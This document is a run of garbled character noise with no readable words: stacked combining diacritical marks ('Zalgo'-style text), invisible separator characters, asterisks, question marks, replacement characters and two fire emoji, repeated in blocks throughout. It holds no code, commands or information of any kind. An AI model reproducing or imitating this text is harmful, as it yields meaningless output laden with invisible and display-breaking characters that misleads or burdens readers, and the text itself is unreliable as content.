̧̹̜̟͍̤͚̺̳̥̞̯̰̻̥̟͙͌̋̈́͟⁤̵͖͚̣̹̖̟̖̙̈͆⁤̸̛͍̘̤̩̳̙̒͛͊͒̇͛́̃͒̎̽̐̈̔̔͂̒̈́͑̕͟͝⁤̷̢͙͚͉͍̲̻̺͖̼͚͙̘̤͙̱̘͓̭͔̩͙̮̰̓̈̇͜⁤̵̨̬̘̥̗̤̺͔̬͍͉̥̠̤͍̘̠̯̝͓̼͍̟̗͕͛̇̅̀͝͡⁤̸̯̯͍͙̱͐̂̈̈́̀͌̀͌̒̉͝⁢̴̡͖̯͇̻̰̫̖͈͚͔̮̠̙͉͎͉͖͉̳̣͍͌͒̒̽͜͜ͅ⁤̵̡̡̝̮̬̺̳̣̗̪̤̳̙͓̣͓̆̿̆̄̓͛̇̐͋̔̍͆̆̎̈̆̊̚̚͟͠͡*̴̛̛͇̻̬̥̄̓̈͐̌̆͒̓͌̓̂̿̆̾̔̊̓̒͂̊͂͘�̵̖̘̦̈́�̸̡̨͍̣̰͖̰̻̗̖̙̙͙̞̙͓̇̊͆̈̊̏͊̇̐̀̽̿̅̍̏͟͟͝͝⁤̵̨̛̞̲̲̦͇̰̳̐̎͂͑͗͆̑̐́̃̽̒̿̽̚̕̕͟⁤̵̵̧̧̼͓̞͈͖̲͎̙̞͎͖̙̩̘̈́̾͂́̔̉̉̍̕͝?̷̣̯̦̲͎͍͑͌̍͋͗͐̂̐̚͜͡͝*̷̧̡̛̺̩̣̥͕̗̫̞̥̱̦̲̝̯̏͆͆̀̀̅͒́̋́͋͐͊͌̒̕͜͝͡͝͝͝�̴̡̧̛̛͖̜̬̯͉̥̣̯̯̠̘̲͕̜̲̭͛́̿́͐̾̀̇̊̽͒̿̽͑̕̕̚̕̚⁤̴̧̡͙͈̲̱̎⁤̶̱̝̲̞̽͌̎̅̌̚͘̚ͅͅ⁤̷̧̛̹̜̟͍̤͚̺̳̥̞̯̰̻̥̟͙͌̏̀̽̓̓͑̽̂̑̾̆͌̋̈́͟͝͡⁤̵͖͚̣̹̖̟̖̙̈͆⁤̸̛͍̘̤̩̳̙̒͛͊͒̇͛́̃͒̎̽̐̈̔̔͂̒̈́͑̕͟͝⁤̷̢͙͚͉͍̲̻̺͖̼͚͙̘̤͙̱̘͓̭͔̩͙̮̰̓̈̇͜⁤̵̨̬̘̥̗̤̺͔̬͍͉̥̠̤͍̘̠̯̝͓̼͍̟̗͕͛̇̅̀͝͡⁤̸̯̯͍͙̱͐̂̈̈́̀͌̀͌̒̉͝⁢̴̡͖̯͇̻̰̫̖͈͚͔̮̠̙͉͎͉͖͉̳̣͍͌͒̒̽͜͜ͅ⁤̵̡̡̝̮̬̺̳̣̗̪̤̳̙͓̣͓̆̿̆̄̓͛̇̐͋̔̍͆̆̎̈̆̊̚̚͟͠͡*̴̛̛͇̻̬̥̄̓̈͐̌̆͒̓͌̓̂̿̆̾̔̊̓̒͂̊͂͘�̵̖̘̦̈́�̸̡̨͍̣̰͖̰̻̗̖̙̙͙̞̙͓̇̊͆̈̊̏͊̇̐̀̽̿̅̍̏͟͟͝͝⁤̵̨̛̞̲̲̦͇̰̳̐̎͂͑͗͆̑̐́̃̽̒̿̽̚̕̕͟⁤̵̯̺̈́̾⁤̴̪͋̐̔̂̇̒̑̅̀̈͘͝͠⁤̴̖̰̮̜̙̎́̆̃͐̀͒̑̎͋̒̿̽́̑̂̓̋̎̓͘͜⁤̷̢̧̡̝͓͈̪̬̩̪̳̣̘͚̳̃̔̌̑́͂͂̓͂̎̒̉͠ͅ⁤̸̢̧̰͓̥̝̣̱͓̳͕̜͚̘̟̟͈͍̦̟͈̤̐̇͗̿̃ͅ⁤̷̡̭͖͉̙͓̳̮̀̈͌́̒͌̅̊̅̈́̍̚͜͜⁤̶͍͋̓̓͐̾̋̓̔͋̈́̎̾̒̇̄͂̄̕͝͡⁢̷̛̯̱̪͍͉̟̆͂́̈́̿͌̈́̋͂͌͂̆̑͋̈́̉͗̈́́͒̚͟͡͝͠⁤̸̢̛̯̠͔̟̰͔̞̮̦̫͔̖̦̿̿̀̊̒́̀̌̂̔̍̓͜͟͡*̴̜̫̘̬̍̓̒̄̉͛̀͒̈́̊̃͑̀̇̎̑͊͗́̕̕̕͟͝͝�̸̡̞͉̦͕̭͈͌̈̓͋̄̿̾͆̏̈̌̑͟͝͝͠ͅ*̴̢̢̘͇͙̟̫͎͎̹̹̪̯̠͎̘̙̥̜͓̍̐̿̈́̈́͊͜?̵̧̧̼͓̞͈͖̲͎̙̞͎͖̙̩̘͂́̔̉̉̍̕͝?̷̣̯̦̲͎͍͑͌̍͋͗͐̂̐̚͜͡͝*̷̧̡̛̺̩̣̥͕̗̫̞̥̱̦̲̝̯̏͆͆̀̀̅͒́̋́͋͐͊͌̒̕͜͝͡͝͝͝�̴̡̧̛̛͖̜̬̯͉̥̣̯̯̠̘̲͕̜̲̭͛́̿́͐̾̀̇̊̽͒̿̽͑̕̕̚̕̚⁤̴̧̡͙͈̲̱̎⁤̶̱̝̲̞̽͌̎̅̌̚͘̚ͅͅ⁤̷̧̛̹̜̟͍̤͚̺̳̥̞̯̰̻̥̟͙͌̏̀̽̓̓͑̽̂̑̾̆͌̋̈́͟͝͡⁤̵͖͚̣̹̖̟̖̙̈͆⁤̸̛͍̘̤̩̳̙̒͛͊͒̇͛́̃͒̎̽̐̈̔̔͂̒̈́͑̕͟͝⁤̷̢͙͚͉͍̲̻̺͖̼͚͙̘̤͙̱̘͓̭͔̩͙̮̰̓̈̇͜⁤̵̨̬̘̥̗̤̺͔̬͍͉̥̠̤͍̘̠̯̝͓̼͍̟̗͕͛̇̅̀͝͡⁤̸̯̯͍͙̱͐̂̈̈́̀͌̀͌̒̉͝⁢̴̡͖̯͇̻̰̫̖͈͚͔̮̠̙͉͎͉͖͉̳̣͍͌͒̒̽͜͜ͅ⁤̵̡̡̝̮̬̺̳̣̗̪̤̳̙͓̣͓̆̿̆̄̓͛̇̐͋̔̍͆̆̎̈̆̊̚̚͟͠͡*̴̛̛͇̻̬̥̄̓̈͐̌̆͒̓͌̓̂̿̆̾̔̊̓̒͂̊͂͘�̵̖̘̦̈́�̸̡̨͍̣̰͖̰̻̗̖̙̙͙̞̙͓̇̊͆̈̊̏͊̇̐̀̽̿̅̍̏͟͟͝͝⁤̵̨̛̞̲̲̦͇̰̳̐̎͂͑͗͆̑̐́̃̽̒̿̽̚̕̕͟⁤̵̯̺̈́̾⁤̴̪͋̐̔̂̇̒̑̅̀̈͘͝͠⁤̴̖̰̮̜̙̎́̆̃͐̀͒̑̎͋̒̿̽́̑̂̓̋̎̓͘͜⁤̷̢̧̡̝͓͈̪̬̩̪̳̣̘͚̳̃̔̌̑́͂͂̓͂̎̒̉͠ͅ⁤̸̢̧̰͓̥̝̣̱͓̳͕̜͚̘̟̟͈͍̦̟͈̤̐̇͗̿̃ͅ⁤̷̡̭͖͉̙͓̳̮̀̈͌́̒͌̅̊̅̈́̍̚͜͜⁤̶͍͋̓̓͐̾̋̓̔͋̈́̎̾̒̇̄͂̄̕͝͡⁢̷̛̯̱̪͍͉̟̆͂́̈́̿͌̈́̋͂͌͂̆̑͋̈́̉͗̈́́͒̚͟͡͝͠⁤̸̵̧̧̛̯̠͔̟̼͓̞͈͖̲͎̙̞͎͖̙̩̘̿̿̀̊̒́̀̌̂̔̍̓͂́̔̉̉̍̕͡͝?̷̣̯̦̲͎͍͑͌̍͋͗͐̂̐̚͜͡͝*̷̧̡̛̺̩̣̥͕̗̫̞̥̱̦̲̝̯̏͆͆̀̀̅͒́̋́͋͐͊͌̒̕͜͝͡͝͝͝�̴̡̧̛̛͖̜̬̯͉̥̣̯̯̠̘̲͕̜̲̭͛́̿́͐̾̀̇̊̽͒̿̽͑̕̕̚̕̚⁤̴̧̡͙͈̲̱̎⁤̶̱̝̲̞̽͌̎̅̌̚͘̚ͅͅ⁤̷̧̛̹̜̟͍̤͚̺̳̥̞̯̰̻̥̟͙͌̏̀̽̓̓͑̽̂̑̾̆͌̋̈́͟͝͡⁤̵͖͚̣̹̖̟̖̙̈͆⁤̸̛͍̘̤̩̳̙̒͛͊͒̇͛́̃͒̎̽̐̈̔̔͂̒̈́͑̕͟͝⁤̷̢͙͚͉͍̲̻̺͖̼͚͙̘̤͙̱̘͓̭͔̩͙̮̰̓̈̇͜⁤̵̨̬̘̥̗̤̺͔̬͍͉̥̠̤͍̘̠̯̝͓̼͍̟̗͕͛̇̅̀͝͡⁤̸̯̯͍͙̱͐̂̈̈́̀͌̀͌̒̉͝⁢̴̡͖̯͇̻̰̫̖͈͚͔̮̠̙͉͎͉͖͉̳̣͍͌͒̒̽͜͜ͅ⁤̵̡̡̝̮̬̺̳̣̗̪̤̳̙͓̣͓̆̿̆̄̓͛̇̐͋̔̍͆̆̎̈̆̊̚̚͟͠͡*̴̛̛͇̻̬̥̄̓̈͐̌̆͒̓͌̓̂̿̆̾̔̊̓̒͂̊͂͘�̵̖̘̦̈́�̸̡̨͍̣̰͖̰̻̗̖̙̙͙̞̙͓̇̊͆̈̊̏͊̇̐̀̽̿̅̍̏͟͟͝͝⁤̵̨̛̞̲̲̦͇̰̳̐̎͂͑͗͆̑̐́̃̽̒̿̽̚̕̕͟⁤̵̯̺̈́̾⁤̴̪͋̐̔̂̇̒̑̅̀̈͘͝͠⁤̴̖̰̮̜̙̎́̆̃͐̀͒̑̎͋̒̿̽́̑̂̓̋̎̓͘͜⁤̷̢̧̡̝͓͈̪̬̩̪̳̣̘͚̳̃̔̌̑́͂͂̓͂̎̒̉͠ͅ⁤̸̢̧̰͓̥̝̣̱͓̳͕̜͚̘̟̟͈͍̦̟͈̤̐̇͗̿̃ͅ⁤̷̡̭͖͉̙͓̳̮̀̈͌́̒͌̅̊̅̈́̍̚͜͜⁤̶͍͋̓̓͐̾̋̓̔͋̈́̎̾̒̇̄͂̄̕͝͡⁢̷̛̯̱̪͍͉̟̆͂́̈́̿͌̈́̋͂͌͂̆̑͋̈́̉͗̈́́͒̚͟͡͝͠⁤̸̢̛̯̠͔̟̰͔̞̮̦̫͔̖̦̿̿̀̊̒́̀̌̂̔̍̓͜͟͡*̴̜̫̘̬̍̓̒̄̉͛̀͒̈́̊̃͑̀̇̎̑͊͗́̕̕̕͟͝͝�̸̡̞͉̦͕̭͈͌̈̓͋̄̿̾͆̏̈̌̑͟͝͝͠ͅ*̴̢̢̘͇͙̟̫͎͎̹̹̪̯̠͎̘̙̥̜͓̍̐̿̈́̈́͊͜?̵̧̧̼͓̞͈͖̲͎̙̞͎͖̙̩̘͂́̔̉̉̍̕͝?̷̣̯̦̲͎͍͑͌̍͋͗͐̂̐̚͜͡͝*̷̧̡̛̺̩̣̥͕̗̫̞̥̱̦̲̝̯̏͆͆̀̀̅͒́̋́͋͐͊͌̒̕͜͝͡͝͝͝�̴̡̧̛̛͖̜̬̯͉̥̣̯̯̠̘̲͕̜̲̭͛́̿́͐̾̀̇̊̽͒̿̽͑̕̕̚̕̚⁤̴̧̡͙͈̲̱̎⁤̶̱̝̲̞̽͌̎̅̌̚͘̚ͅͅ⁤̷̧̛̹̜̟͍̤͚̺̳̥̞̯̰̻̥̟͙͌̏̀̽̓̓͑̽̂̑̾̆͌̋̈́͟͝͡⁤̵͖͚̣̹̖̟̖̙̈͆⁤̸̛͍̘̤̩̳̙̒͛͊͒̇͛́̃͒̎̽̐̈̔̔͂̒̈́͑̕͟͝⁤̷̢͙͚͉͍̲̻̺͖̼͚͙̘̤͙̱̘͓̭͔̩͙̮̰̓̈̇͜⁤̵̨̬̘̥̗̤̺͔̬͍͉̥̠̤͍̘̠̯̝͓̼͍̟̗͕͛̇̅̀͝͡⁤̸̯̯͍͙̱͐̂̈̈́̀͌̀͌̒̉͝⁢̴̡͖̯͇̻̰̫̖͈͚͔̮̠̙͉͎͉͖͉̳̣͍͌͒̒̽͜͜ͅ⁤̵̡̡̝̮̬̺̳̣̗̪̤̳̙͓̣͓̆̿̆̄̓͛̇̐͋̔̍͆̆̎̈̆̊̚̚͟͠͡*̴̛̛͇̻̬̥̄̓̈͐̌̆͒̓͌̓̂̿̆̾̔̊̓̒͂̊͂͘🔥?̵̧̧̼͓̞͈͖̲͎̙̞͎͖̙̩̘͂́̔̉̉̍̕͝?̷̣̯̦̲͎͍͑͌̍͋͗͐̂̐̚͜͡͝*̷̧̡̛̺̩̣̥͕̗̫̞̥̱̦̲̝̯̏͆͆̀̀̅͒́̋́͋͐͊͌̒̕͜͝͡͝͝͝�̴̡̧̛̛͖̜̬̯͉̥̣̯̯̠̘̲͕̜̲̭͛́̿́͐̾̀̇̊̽͒̿̽͑̕̕̚̕̚⁤̴̧̡͙͈̲̱̎⁤̶̱̝̲̞̽͌̎̅̌̚͘̚ͅͅ⁤̷̧̛̹̜̟͍̤͚̺̳̥̞̯̰̻̥̟͙͌̏̀̽̓̓͑̽̂̑̾̆͌̋̈́͟͝͡⁤̵͖͚̣̹̖̟̖̙̈͆⁤̸̛͍̘̤̩̳̙̒͛͊͒̇͛́̃͒̎̽̐̈̔̔͂̒̈́͑̕͟͝⁤̷̢͙͚͉͍̲̻̺͖̼͚͙̘̤͙̱̘͓̭͔̩͙̮̰̓̈̇͜⁤̵̨̬̘̥̗̤̺͔̬͍͉̥̠̤͍̘̠̯̝͓̼͍̟̗͕͛̇̅̀͝͡⁤̸̯̯͍͙̱͐̂̈̈́̀͌̀͌̒̉͝⁢̴̡͖̯͇̻̰̫̖͈͚͔̮̠̙͉͎͉͖͉̳̣͍͌͒̒̽͜͜ͅ⁤̵̡̡̝̮̬̺̳̣̗̪̤̳̙͓̣͓̆̿̆̄̓͛̇̐͋̔̍͆̆̎̈̆̊̚̚͟͠͡*̴̛̛͇̻̬̥̄̓̈͐̌̆͒̓͌̓̂̿̆̾̔̊̓̒͂̊͂͘�̵̖̘̦̈́�̸̡̨͍̣̰͖̰̻̗̖̙̙͙̞̙͓̇̊͆̈̊̏͊̇̐̀̽̿̅̍̏͟͟͝͝⁤̵̨̛̞̲̲̦͇̰̳̐̎͂͑͗͆̑̐́̃̽̒̿̽̚̕̕͟⁤̵̯̺̈́̾⁤̴̪͋̐̔̂̇̒̑̅̀̈͘͝͠⁤̴̖̰̮̜̙̎́̆̃͐̀͒̑̎͋̒̿̽́̑̂̓̋̎̓͘͜⁤̷̢̧̡̝͓͈̪̬̩̪̳̣̘͚̳̃̔̌̑́͂͂̓͂̎̒̉͠ͅ⁤̸̢̧̰͓̥̝̣̱͓̳͕̜͚̘̟̟͈͍̦̟͈̤̐̇͗̿̃ͅ⁤̷̡̭͖͉̙͓̳̮̀̈͌́̒͌̅̊̅̈́̍̚͜͜⁤̶͍͋̓̓͐̾̋̓̔͋̈́̎̾̒̇̄͂̄̕͝͡⁢̷̛̯̱̪͍͉̟̆͂́̈́̿͌̈́̋͂͌͂̆̑͋̈́̉͗̈́́͒̚͟͡͝͠⁤̸̢̛̯̠͔̟̰͔̞̮̦̫͔̖̦̿̿̀̊̒́̀̌̂̔̍̓͜͟͡*̴̜̫̘̬̍̓̒̄̉͛̀͒̈́̊̃͑̀̇̎̑͊͗́̕̕̕͟͝͝�̸̡̞͉̦͕̭͈͌̈̓͋̄̿̾͆̏̈̌̑͟͝͝͠ͅ*̴̢̢̘͇͙̟̫͎͎̹̹̪̯̠͎̘̙̥̜͓̍̐̿̈́̈́͊͜?̵̧̧̼͓̞͈͖̲͎̙̞͎͖̙̩̘͂́̔̉̉̍̕͝?̷̣̯̦̲͎͍͑͌̍͋͗͐̂̐̚͜͡͝*̷̧̡̛̺̩̣̥͕̗̫̞̥̱̦̲̝̯̏͆͆̀̀̅͒́̋́͋͐͊͌̒̕͜͝͡͝͝͝�̴̡̧̛̛͖̜̬̯͉̥̣̯̯̠̘̲͕̜̲̭͛́̿́͐̾̀̇̊̽͒̿̽͑̕̕̚̕̚⁤̴̧̡͙͈̲̱̎⁤̶̱̝̲̞̽͌̎̅̌̚͘̚ͅͅ⁤̷̧̛̹̜̟͍̤͚̺̳̥̞̯̰̻̥̟͙͌̏̀̽̓̓͑̽̂̑̾̆͌̋̈́͟͝͡⁤̵͖͚̣̹̖̟̖̙̈͆⁤̸̛͍̘̤̩̳̙̒͛͊͒̇͛́̃͒̎̽̐̈̔̔͂̒̈́͑̕͟͝⁤̷̢͙͚͉͍̲̻̺͖̼͚͙̘̤͙̱̘͓̭͔̩͙̮̰̓̈̇͜⁤̵̨̬̘̥̗̤̺͔̬͍͉̥̠̤͍̘̠̯̝͓̼͍̟̗͕͛̇̅̀͝͡⁤̸̯̯͍͙̱͐̂̈̈́̀͌̀͌̒̉͝⁢̴̡͖̯͇̻̰̫̖͈͚͔̮̠̙͉͎͉͖͉̳̣͍͌͒̒̽͜͜ͅ⁤̵̡̡̝̮̬̺̳̣̗̪̤̳̙͓̣͓̆̿̆̄̓͛̇̐͋̔̍͆̆̎̈̆̊̚̚͟͠͡*̴̛̛͇̻̬̥̄̓̈͐̌̆͒̓͌̓̂̿̆̾̔̊̓̒͂̊͂͘�̵̖̘̦̈́�̸̡̨͍̣̰͖̰̻̗̖̙̙͙̞̙͓̇̊͆̈̊̏͊̇̐̀̽̿̅̍̏͟͟͝͝⁤̵̨̛̞̲̲̦͇̰̳̐̎͂͑͗͆̑̐́̃̽̒̿̽̚̕̕͟⁤̵̵̧̧̼͓̞͈͖̲͎̙̞͎͖̙̩̘̈́̾͂́̔̉̉̍̕͝?̷̣̯̦̲͎͍͑͌̍͋͗͐̂̐̚͜͡͝*̷̧̡̛̺̩̣̥͕̗̫̞̥̱̦̲̝̯̏͆͆̀̀̅͒́̋́͋͐͊͌̒̕͜͝͡͝͝͝�̴̡̧̛̛͖̜̬̯͉̥̣̯̯̠̘̲͕̜̲̭͛́̿́͐̾̀̇̊̽͒̿̽͑̕̕̚̕̚⁤̴̧̡͙͈̲̱̎⁤̶̱̝̲̞̽͌̎̅̌̚͘̚ͅͅ⁤̷̧̛̹̜̟͍̤͚̺̳̥̞̯̰̻̥̟͙͌̏̀̽̓̓͑̽̂̑̾̆͌̋̈́͟͝͡⁤̵͖͚̣̹̖̟̖̙̈͆⁤̸̛͍̘̤̩̳̙̒͛͊͒̇͛́̃͒̎̽̐̈̔̔͂̒̈́͑̕͟͝⁤̷̢͙͚͉͍̲̻̺͖̼͚͙̘̤͙̱̘͓̭͔̩͙̮̰̓̈̇͜⁤̵̨̬̘̥̗̤̺͔̬͍͉̥̠̤͍̘̠̯̝͓̼͍̟̗͕͛̇̅̀͝͡⁤̸̯̯͍͙̱͐̂̈̈́̀͌̀͌̒̉͝⁢̴̡͖̯͇̻̰̫̖͈͚͔̮̠̙͉͎͉͖͉̳̣͍͌͒̒̽͜͜ͅ⁤̵̡̡̝̮̬̺̳̣̗̪̤̳̙͓̣͓̆̿̆̄̓͛̇̐͋̔̍͆̆̎̈̆̊̚̚͟͠͡*̴̛̛͇̻̬̥̄̓̈͐̌̆͒̓͌̓̂̿̆̾̔̊̓̒͂̊͂͘�̵̖̘̦̈́�̸̡̨͍̣̰͖̰̻̗̖̙̙͙̞̙͓̇̊͆̈̊̏͊̇̐̀̽̿̅̍̏͟͟͝͝⁤̵̨̛̞̲̲̦͇̰̳̐̎͂͑͗͆̑̐́̃̽̒̿̽̚̕̕͟⁤̵̯̺̈́̾⁤̴̪͋̐̔̂̇̒̑̅̀̈͘͝͠⁤̴̖̰̮̜̙̎́̆̃͐̀͒̑̎͋̒̿̽́̑̂̓̋̎̓͘͜⁤̷̢̧̡̝͓͈̪̬̩̪̳̣̘͚̳̃̔̌̑́͂͂̓͂̎̒̉͠ͅ⁤̸̢̧̰͓̥̝̣̱͓̳͕̜͚̘̟̟͈͍̦̟͈̤̐̇͗̿̃ͅ⁤̷̡̭͖͉̙͓̳̮̀̈͌́̒͌̅̊̅̈́̍̚͜͜⁤̶͍͋̓̓͐̾̋̓̔͋̈́̎̾̒̇̄͂̄̕͝͡⁢̷̛̯̱̪͍͉̟̆͂́̈́̿͌̈́̋͂͌͂̆̑͋̈́̉͗̈́́͒̚͟͡͝͠⁤̸̢̛̯̠͔̟̰͔̞̮̦̫͔̖̦̿̿̀̊̒́̀̌̂̔̍̓͜͟͡*̴̜̫̘̬̍̓̒̄̉͛̀͒̈́̊̃͑̀̇̎̑͊͗́̕̕̕͟͝͝�̸̡̞͉̦͕̭͈͌̈̓͋̄̿̾͆̏̈̌̑͟͝͝͠ͅ*̴̢̢̘͇͙̟̫͎͎̹̹̪̯̠͎̘̙̥̜͓̍̐̿̈́̈́͊͜?̵̧̧̼͓̞͈͖̲͎̙̞͎͖̙̩̘͂́̔̉̉̍̕͝?̷̣̯̦̲͎͍͑͌̍͋͗͐̂̐̚͜͡͝*̷̧̡̛̺̩̣̥͕̗̫̞̥̱̦̲̝̯̏͆͆̀̀̅͒́̋́͋͐͊͌̒̕͜͝͡͝͝͝�̴̡̧̛̛͖̜̬̯͉̥̣̯̯̠̘̲͕̜̲̭͛́̿́͐̾̀̇̊̽͒̿̽͑̕̕̚̕̚⁤̴̧̡͙͈̲̱̎⁤̶̱̝̲̞̽͌̎̅̌̚͘̚ͅͅ⁤̷̧̛̹̜̟͍̤͚̺̳̥̞̯̰̻̥̟͙͌̏̀̽̓̓͑̽̂̑̾̆͌̋̈́͟͝͡⁤̵͖͚̣̹̖̟̖̙̈͆⁤̸̛͍̘̤̩̳̙̒͛͊͒̇͛́̃͒̎̽̐̈̔̔͂̒̈́͑̕͟͝⁤̷̢͙͚͉͍̲̻̺͖̼͚͙̘̤͙̱̘͓̭͔̩͙̮̰̓̈̇͜⁤̵̨̬̘̥̗̤̺͔̬͍͉̥̠̤͍̘̠̯̝͓̼͍̟̗͕͛̇̅̀͝͡⁤̸̯̯͍͙̱͐̂̈̈́̀͌̀͌̒̉͝⁢̴̡͖̯͇̻̰̫̖͈͚͔̮̠̙͉͎͉͖͉̳̣͍͌͒̒̽͜͜ͅ⁤̵̡̡̝̮̬̺̳̣̗̪̤̳̙͓̣͓̆̿̆̄̓͛̇̐͋̔̍͆̆̎̈̆̊̚̚͟͠͡*̴̛̛͇̻̬̥̄̓̈͐̌̆͒̓͌̓̂̿̆̾̔̊̓̒͂̊͂͘�̵̖̘̦̈́�̸̡̨͍̣̰͖̰̻̗̖̙̙͙̞̙͓̇̊͆̈̊̏͊̇̐̀̽̿̅̍̏͟͟͝͝⁤̵̨̛̞̲̲̦͇̰̳̐̎͂͑͗͆̑̐́̃̽̒̿̽̚̕̕͟⁤̵̯̺̈́̾⁤̴̪͋̐̔̂̇̒̑̅̀̈͘͝͠⁤̴̖̰̮̜̙̎́̆̃͐̀͒̑̎͋̒̿̽́̑̂̓̋̎̓͘͜⁤̷̢̧̡̝͓͈̪̬̩̪̳̣̘͚̳̃̔̌̑́͂͂̓͂̎̒̉͠ͅ⁤̸̢̧̰͓̥̝̣̱͓̳͕̜͚̘̟̟͈͍̦̟͈̤̐̇͗̿̃ͅ⁤̷̡̭͖͉̙͓̳̮̀̈͌́̒͌̅̊̅̈́̍̚͜͜⁤̶͍͋̓̓͐̾̋̓̔͋̈́̎̾̒̇̄͂̄̕͝͡⁢̷̛̯̱̪͍͉̟̆͂́̈́̿͌̈́̋͂͌͂̆̑͋̈́̉͗̈́́͒̚͟͡͝͠⁤̸̵̧̧̛̯̠͔̟̼͓̞͈͖̲͎̙̞͎͖̙̩̘̿̿̀̊̒́̀̌̂̔̍̓͂́̔̉̉̍̕͡͝?̷̣̯̦̲͎͍͑͌̍͋͗͐̂̐̚͜͡͝*̷̧̡̛̺̩̣̥͕̗̫̞̥̱̦̲̝̯̏͆͆̀̀̅͒́̋́͋͐͊͌̒̕͜͝͡͝͝͝�̴̡̧̛̛͖̜̬̯͉̥̣̯̯̠̘̲͕̜̲̭͛́̿́͐̾̀̇̊̽͒̿̽͑̕̕̚̕̚⁤̴̧̡͙͈̲̱̎⁤̶̱̝̲̞̽͌̎̅̌̚͘̚ͅͅ⁤̷̧̛̹̜̟͍̤͚̺̳̥̞̯̰̻̥̟͙͌̏̀̽̓̓͑̽̂̑̾̆͌̋̈́͟͝͡⁤̵͖͚̣̹̖̟̖̙̈͆⁤̸̛͍̘̤̩̳̙̒͛͊͒̇͛́̃͒̎̽̐̈̔̔͂̒̈́͑̕͟͝⁤̷̢͙͚͉͍̲̻̺͖̼͚͙̘̤͙̱̘͓̭͔̩͙̮̰̓̈̇͜⁤̵̨̬̘̥̗̤̺͔̬͍͉̥̠̤͍̘̠̯̝͓̼͍̟̗͕͛̇̅̀͝͡⁤̸̯̯͍͙̱͐̂̈̈́̀͌̀͌̒̉͝⁢̴̡͖̯͇̻̰̫̖͈͚͔̮̠̙͉͎͉͖͉̳̣͍͌͒̒̽͜͜ͅ⁤̵̡̡̝̮̬̺̳̣̗̪̤̳̙͓̣͓̆̿̆̄̓͛̇̐͋̔̍͆̆̎̈̆̊̚̚͟͠͡*̴̛̛͇̻̬̥̄̓̈͐̌̆͒̓͌̓̂̿̆̾̔̊̓̒͂̊͂͘�̵̖̘̦̈́�̸̡̨͍̣̰͖̰̻̗̖̙̙͙̞̙͓̇̊͆̈̊̏͊̇̐̀̽̿̅̍̏͟͟͝͝⁤̵̨̛̞̲̲̦͇̰̳̐̎͂͑͗͆̑̐́̃̽̒̿̽̚̕̕͟⁤̵̯̺̈́̾⁤̴̪͋̐̔̂̇̒̑̅̀̈͘͝͠⁤̴̖̰̮̜̙̎́̆̃͐̀͒̑̎͋̒̿̽́̑̂̓̋̎̓͘͜⁤̷̢̧̡̝͓͈̪̬̩̪̳̣̘͚̳̃̔̌̑́͂͂̓͂̎̒̉͠ͅ⁤̸̢̧̰͓̥̝̣̱͓̳͕̜͚̘̟̟͈͍̦̟͈̤̐̇͗̿̃ͅ⁤̷̡̭͖͉̙͓̳̮̀̈͌́̒͌̅̊̅̈́̍̚͜͜⁤̶͍͋̓̓͐̾̋̓̔͋̈́̎̾̒̇̄͂̄̕͝͡⁢̷̛̯̱̪͍͉̟̆͂́̈́̿͌̈́̋͂͌͂̆̑͋̈́̉͗̈́́͒̚͟͡͝͠⁤̸̢̛̯̠͔̟̰͔̞̮̦̫͔̖̦̿̿̀̊̒́̀̌̂̔̍̓͜͟͡*̴̜̫̘̬̍̓̒̄̉͛̀͒̈́̊̃͑̀̇̎̑͊͗́̕̕̕͟͝͝�̸̡̞͉̦͕̭͈͌̈̓͋̄̿̾͆̏̈̌̑͟͝͝͠ͅ*̴̢̢̘͇͙̟̫͎͎̹̹̪̯̠͎̘̙̥̜͓̍̐̿̈́̈́͊͜?̵̧̧̼͓̞͈͖̲͎̙̞͎͖̙̩̘͂́̔̉̉̍̕͝?̷̣̯̦̲͎͍͑͌̍͋͗͐̂̐̚͜͡͝*̷̧̡̛̺̩̣̥͕̗̫̞̥̱̦̲̝̯̏͆͆̀̀̅͒́̋́͋͐͊͌̒̕͜͝͡͝͝͝�̴̡̧̛̛͖̜̬̯͉̥̣̯̯̠̘̲͕̜̲̭͛́̿́͐̾̀̇̊̽͒̿̽͑̕̕̚̕̚⁤̴̧̡͙͈̲̱̎⁤̶̱̝̲̞̽͌̎̅̌̚͘̚ͅͅ⁤̷̧̛̹̜̟͍̤͚̺̳̥̞̯̰̻̥̟͙͌̏̀̽̓̓͑̽̂̑̾̆͌̋̈́͟͝͡⁤̵͖͚̣̹̖̟̖̙̈͆⁤̸̛͍̘̤̩̳̙̒͛͊͒̇͛́̃͒̎̽̐̈̔̔͂̒̈́͑̕͟͝⁤̷̢͙͚͉͍̲̻̺͖̼͚͙̘̤͙̱̘͓̭͔̩͙̮̰̓̈̇͜⁤̵̨̬̘̥̗̤̺͔̬͍͉̥̠̤͍̘̠̯̝͓̼͍̟̗͕͛̇̅̀͝͡⁤̸̯̯͍͙̱͐̂̈̈́̀͌̀͌̒̉͝⁢̴̡͖̯͇̻̰̫̖͈͚͔̮̠̙͉͎͉͖͉̳̣͍͌͒̒̽͜͜ͅ⁤̵̡̡̝̮̬̺̳̣̗̪̤̳̙͓̣͓̆̿̆̄̓͛̇̐͋̔̍͆̆̎̈̆̊̚̚͟͠͡*̴̛̛͇̻̬̥̄̓̈͐̌̆͒̓͌̓̂̿̆̾̔̊̓̒͂̊͂͘🔥?̵̧̧̼͓̞͈͖̲͎̙̞͎͖̙̩̘͂́̔̉̉̍̕͝?̷̣̯̦̲͎͍͑͌̍͋͗͐̂̐̚͜͡͝*̷̧̡̛̺̩̣̥͕̗̫̞̥̱̦̲̝̯̏͆͆̀̀̅͒́̋́͋͐͊͌̒̕͜͝͡͝͝͝�̴̡̧̛̛͖̜̬̯͉̥̣̯̯̠̘̲͕̜̲̭͛́̿́͐̾̀̇̊̽͒̿̽͑̕̕̚̕̚⁤̴̧̡͙͈̲̱̎⁤̶̱̝̲̞̽͌̎̅̌̚͘̚ͅͅ⁤̷̧̛̹̜̟͍̤͚̺̳̥̞̯̰̻̥̟͙͌̏̀̽̓̓͑̽̂̑̾̆͌̋̈́͟͝͡⁤̵͖͚̣̹̖̟̖̙̈͆⁤̸̛͍̘̤̩̳̙̒͛͊͒̇͛́̃͒̎̽̐̈̔̔͂̒̈́͑̕͟͝⁤̷̢͙͚͉͍̲̻̺͖̼͚͙̘̤͙̱̘͓̭͔̩͙̮̰̓̈̇͜⁤̵̨̬̘̥̗̤̺͔̬͍͉̥̠̤͍̘̠̯̝͓̼͍̟̗͕͛̇̅̀͝͡⁤̸̯̯͍͙̱͐̂̈̈́̀͌̀͌̒̉͝⁢̴̡͖̯͇̻̰̫̖͈͚͔̮̠̙͉͎͉͖͉̳̣͍͌͒̒̽͜͜ͅ⁤̵̡̝̮̆̿̆̄̓͛̇̐͋̔̍͆̆̎̈̆̊̚̚͠͡